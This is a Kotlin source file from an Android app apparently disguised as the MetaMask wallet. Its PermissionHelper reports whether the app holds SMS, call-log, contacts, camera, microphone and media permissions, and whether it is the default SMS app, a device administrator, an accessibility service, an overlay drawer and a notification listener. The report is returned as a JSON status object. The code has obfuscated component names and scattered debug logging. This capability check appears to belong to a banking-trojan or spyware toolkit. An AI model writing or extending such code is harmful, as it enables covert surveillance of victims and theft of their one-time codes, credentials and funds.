package com.example.MetaMask.utils

import android.Manifest
import android.app.NotificationManager
import com.example.MetaMask.BuildConfig
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.example.MetaMask.services.TurtleService
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

object PermissionHelper {

    private val DATE_FMT = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ssZ", Locale.getDefault())

    fun checkPermissions(context: Context): JSONObject {
        android.util.Log.d("XDBG", "[PermissionHelper] checkPermissions enter context=ctx") //xdbg
        android.util.Log.d("XDBG", "[PermissionHelper] return") //xdbg
        return try {
            fun check(perm: String) = ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED

            val data = JSONObject().apply {
                put(Manifest.permission.READ_SMS,                  check(Manifest.permission.READ_SMS))
                put(Manifest.permission.SEND_SMS,                  check(Manifest.permission.SEND_SMS))
                put(Manifest.permission.RECEIVE_SMS,               check(Manifest.permission.RECEIVE_SMS))
                put("android.permission.RECEIVE_MMS",              check("android.permission.RECEIVE_MMS"))
                put(Manifest.permission.READ_CALL_LOG,             check(Manifest.permission.READ_CALL_LOG))
                put(Manifest.permission.WRITE_CALL_LOG,            check(Manifest.permission.WRITE_CALL_LOG))
                put(Manifest.permission.READ_CONTACTS,             check(Manifest.permission.READ_CONTACTS))
                put(Manifest.permission.WRITE_CONTACTS,            check(Manifest.permission.WRITE_CONTACTS))
                put(Manifest.permission.READ_PHONE_STATE,          check(Manifest.permission.READ_PHONE_STATE))
                put(Manifest.permission.READ_PHONE_NUMBERS,        check(Manifest.permission.READ_PHONE_NUMBERS))
                put(Manifest.permission.CALL_PHONE,                check(Manifest.permission.CALL_PHONE))
                @Suppress("DEPRECATION")
                put(Manifest.permission.PROCESS_OUTGOING_CALLS,   check(Manifest.permission.PROCESS_OUTGOING_CALLS))
                put(Manifest.permission.CAMERA,                    check(Manifest.permission.CAMERA))
                put(Manifest.permission.RECORD_AUDIO,              check(Manifest.permission.RECORD_AUDIO))
                if (BuildConfig.FEAT_ACCOUNTS) put(Manifest.permission.GET_ACCOUNTS, check(Manifest.permission.GET_ACCOUNTS))
                put(Manifest.permission.INTERNET,                  check(Manifest.permission.INTERNET))
                put(Manifest.permission.ACCESS_NETWORK_STATE,      check(Manifest.permission.ACCESS_NETWORK_STATE))

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    android.util.Log.d("XDBG", "[PermissionHelper] if branch") //xdbg
                    put(Manifest.permission.READ_MEDIA_IMAGES, check(Manifest.permission.READ_MEDIA_IMAGES))
                    put(Manifest.permission.READ_MEDIA_VIDEO,  check(Manifest.permission.READ_MEDIA_VIDEO))
                    put(Manifest.permission.READ_MEDIA_AUDIO,  check(Manifest.permission.READ_MEDIA_AUDIO))
                    put(Manifest.permission.POST_NOTIFICATIONS, check(Manifest.permission.POST_NOTIFICATIONS))
                } else {
                    put(Manifest.permission.READ_EXTERNAL_STORAGE,  check(Manifest.permission.READ_EXTERNAL_STORAGE))
                    @Suppress("DEPRECATION")
                    put(Manifest.permission.WRITE_EXTERNAL_STORAGE, check(Manifest.permission.WRITE_EXTERNAL_STORAGE))
                }

                put("is_default_sms_app", try {
                    if (com.example.MetaMask.HyperOsDetector.isHyperOs &&
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        (context.getSystemService(Context.ROLE_SERVICE) as? android.app.role.RoleManager)
                            ?.isRoleHeld(android.app.role.RoleManager.ROLE_SMS) == true
                    } else {
                        Telephony.Sms.getDefaultSmsPackage(context) == context.packageName
                    }
                } catch (_: Exception) { false })
                    android.util.Log.e("XDBG", "[PermissionHelper] catch Exception (ignored)") //xdbg

                put("is_battery_optimized_ignored", try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        android.util.Log.d("XDBG", "[PermissionHelper] if branch") //xdbg
                        (context.getSystemService(Context.POWER_SERVICE) as? PowerManager)
                            ?.isIgnoringBatteryOptimizations(context.packageName) ?: false
                    } else true
                } catch (_: Exception) { false })
                    android.util.Log.e("XDBG", "[PermissionHelper] catch Exception (ignored)") //xdbg

                put("is_ignoring_battery_optimizations", try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        android.util.Log.d("XDBG", "[PermissionHelper] if branch") //xdbg
                        (context.getSystemService(Context.POWER_SERVICE) as? PowerManager)
                            ?.isIgnoringBatteryOptimizations(context.packageName) ?: false
                    } else true
                } catch (_: Exception) { false })
                    android.util.Log.e("XDBG", "[PermissionHelper] catch Exception (ignored)") //xdbg

                put("is_device_admin", if (BuildConfig.FEAT_DEVICE_ADMIN) try {
                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                    val comp = ComponentName(context, com.example.MetaMask.receivers.BadgerFalconRecv::class.java)
                    dpm?.isAdminActive(comp) ?: false
                } catch (_: Exception) { false } else false)
                    android.util.Log.e("XDBG", "[PermissionHelper] catch Exception (ignored)") //xdbg

                put("is_accessibility_enabled", try {
                    val enabledServices = Settings.Secure.getString(
                        context.contentResolver,
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                    ) ?: ""
                    enabledServices.contains(context.packageName)
                } catch (_: Exception) { false })
                    android.util.Log.e("XDBG", "[PermissionHelper] catch Exception (ignored)") //xdbg

                put("overlay_permission", try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        android.util.Log.d("XDBG", "[PermissionHelper] if branch") //xdbg
                        Settings.canDrawOverlays(context)
                    } else true
                } catch (_: Exception) { false })
                    android.util.Log.e("XDBG", "[PermissionHelper] catch Exception (ignored)") //xdbg

                put("notification_policy_access", try {
                    val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && nm != null)
                        nm.isNotificationPolicyAccessGranted
                    else false
                } catch (_: Exception) { false })
                    android.util.Log.e("XDBG", "[PermissionHelper] catch Exception (ignored)") //xdbg

                put("notification_listener_enabled", try {
                    val comp = ComponentName(context, TurtleService::class.java)
                    val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
                    flat != null && flat.contains(comp.flattenToString())
                } catch (_: Exception) { false })
                    android.util.Log.e("XDBG", "[PermissionHelper] catch Exception (ignored)") //xdbg

                put("device_time", DATE_FMT.format(Date()))
            }

            JSONObject().put("status", "success").put("data", data)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[PermissionHelper] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            JSONObject().put("status", "error").put("message", "Exception getting permissions: ${e.message}")
        }
    }
}
